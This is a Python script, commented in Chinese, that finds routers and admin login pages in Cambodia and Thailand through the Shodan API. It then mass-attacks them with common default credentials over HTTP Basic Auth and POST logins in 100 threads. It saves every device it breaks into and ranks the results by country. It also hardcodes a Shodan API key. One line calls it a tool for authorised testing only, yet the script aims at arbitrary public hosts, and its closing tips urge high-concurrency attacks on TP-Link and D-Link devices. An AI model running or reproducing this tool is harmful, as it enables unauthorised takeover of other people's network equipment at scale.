#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
基于Shodan的快速路由器打点工具
使用你的API密钥快速发现和攻击目标
"""

import requests
import socket
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor
import random

class ShodanQuickPwn:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.shodan.io"
        
        # 最有效的凭据组合
        self.creds = [
            ('admin', 'admin'),
            ('admin', ''),
            ('admin', 'password'),
            ('admin', '1234'),
            ('root', 'admin'),
            ('cisco', 'cisco'),
            ('admin', 'cisco')
        ]
        
        # 攻击结果
        self.pwned = []
        self.failed = []
        
    def get_targets_from_shodan(self, country_code, limit=100):
        """从Shodan获取目标"""
        print(f"🔍 从Shodan获取 {country_code} 的目标...")
        
        targets = []
        
        # 搜索路由器
        queries = [
            f'country:{country_code} title:"router"',
            f'country:{country_code} title:"TP-Link"',
            f'country:{country_code} title:"D-Link"',
            f'country:{country_code} title:"Tenda"',
            f'country:{country_code} port:80 title:"admin"',
            f'country:{country_code} port:8080',
            f'country:{country_code} port:443 title:"login"'
        ]
        
        for query in queries:
            try:
                url = f"{self.base_url}/shodan/host/search"
                params = {
                    'key': self.api_key,
                    'query': query,
                    'limit': limit // len(queries)
                }
                
                response = requests.get(url, params=params, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    for match in data.get('matches', []):
                        targets.append({
                            'ip': match.get('ip_str', ''),
                            'port': match.get('port', 80),
                            'title': match.get('title', ''),
                            'country': match.get('location', {}).get('country_name', ''),
                            'org': match.get('org', '')
                        })
                
                time.sleep(1)  # API限制
                
            except Exception as e:
                print(f"❌ 查询失败: {e}")
                continue
        
        # 去重
        unique_targets = []
        seen_ips = set()
        for target in targets:
            if target['ip'] not in seen_ips:
                unique_targets.append(target)
                seen_ips.add(target['ip'])
        
        print(f"✅ 获取到 {len(unique_targets)} 个唯一目标")
        return unique_targets
    
    def quick_attack(self, target):
        """快速攻击单个目标"""
        ip = target['ip']
        port = target['port']
        
        for username, password in self.creds:
            try:
                # HTTP Basic Auth
                auth = (username, password)
                response = requests.get(
                    f'http://{ip}:{port}',
                    auth=auth,
                    timeout=3,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': 'HTTP Basic Auth',
                        'title': target['title'],
                        'country': target['country'],
                        'org': target['org'],
                        'status': 'SUCCESS'
                    }
                
                # POST登录
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login'
                }
                
                response = requests.post(
                    f'http://{ip}:{port}/login',
                    data=login_data,
                    timeout=3,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': 'POST Login',
                        'title': target['title'],
                        'country': target['country'],
                        'org': target['org'],
                        'status': 'SUCCESS'
                    }
                    
            except:
                continue
        
        return None
    
    def mass_attack(self, targets, max_threads=100):
        """批量攻击"""
        print(f"🚀 开始攻击 {len(targets)} 个目标...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(self.quick_attack, target) for target in targets]
            
            for i, future in enumerate(futures):
                try:
                    result = future.result(timeout=10)
                    if result:
                        self.pwned.append(result)
                        print(f"✅ 成功: {result['ip']}:{result['port']} - {result['username']}:{result['password']} - {result['country']}")
                    else:
                        self.failed.append(targets[i])
                    
                    if (i + 1) % 20 == 0:
                        print(f"📊 已攻击 {i + 1}/{len(targets)} 个目标")
                        
                except:
                    self.failed.append(targets[i])
        
        return self.pwned
    
    def print_results(self):
        """打印结果"""
        print(f"\n" + "="*80)
        print(f"🎯 Shodan快速打点结果")
        print(f"="*80)
        print(f"成功突破: {len(self.pwned)} 台")
        print(f"攻击失败: {len(self.failed)} 台")
        
        if self.pwned:
            print(f"\n🏆 成功突破的设备:")
            for i, pwn in enumerate(self.pwned[:20], 1):
                print(f"   {i}. {pwn['ip']}:{pwn['port']} - {pwn['username']}:{pwn['password']} - {pwn['country']} - {pwn['org']}")
            
            if len(self.pwned) > 20:
                print(f"   ... 还有 {len(self.pwned) - 20} 台设备")
            
            # 按国家统计
            countries = {}
            for pwn in self.pwned:
                country = pwn['country']
                countries[country] = countries.get(country, 0) + 1
            
            print(f"\n📊 按国家统计:")
            for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True):
                print(f"   {country}: {count} 台")
    
    def save_results(self, filename='shodan_pwn_results.json'):
        """保存结果"""
        results = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'successful': self.pwned,
            'failed': self.failed,
            'total_pwned': len(self.pwned),
            'total_failed': len(self.failed)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"💾 结果已保存到: {filename}")

def main():
    """主函数"""
    print("🚀 基于Shodan的快速路由器打点工具")
    print("⚠️  注意: 此工具仅用于授权的安全测试")
    
    api_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
    pwner = ShodanQuickPwn(api_key)
    
    # 获取柬埔寨目标
    print("\n🇰🇭 获取柬埔寨目标...")
    cambodia_targets = pwner.get_targets_from_shodan('KH', limit=50)
    
    # 获取泰国目标
    print("\n🇹🇭 获取泰国目标...")
    thailand_targets = pwner.get_targets_from_shodan('TH', limit=50)
    
    # 合并目标
    all_targets = cambodia_targets + thailand_targets
    print(f"\n📋 总目标数量: {len(all_targets)} 个IP")
    
    if all_targets:
        # 开始攻击
        results = pwner.mass_attack(all_targets)
        
        # 显示结果
        pwner.print_results()
        
        # 保存结果
        pwner.save_results()
    else:
        print("❌ 未获取到任何目标")
    
    print(f"\n💡 快速打点技巧:")
    print(f"   1. 使用Shodan API快速发现目标")
    print(f"   2. 优先攻击TP-Link和D-Link设备")
    print(f"   3. 使用最有效的默认凭据")
    print(f"   4. 高并发多线程攻击")
    print(f"   5. 重点关注柬埔寨和泰国地区")

if __name__ == "__main__":
    main()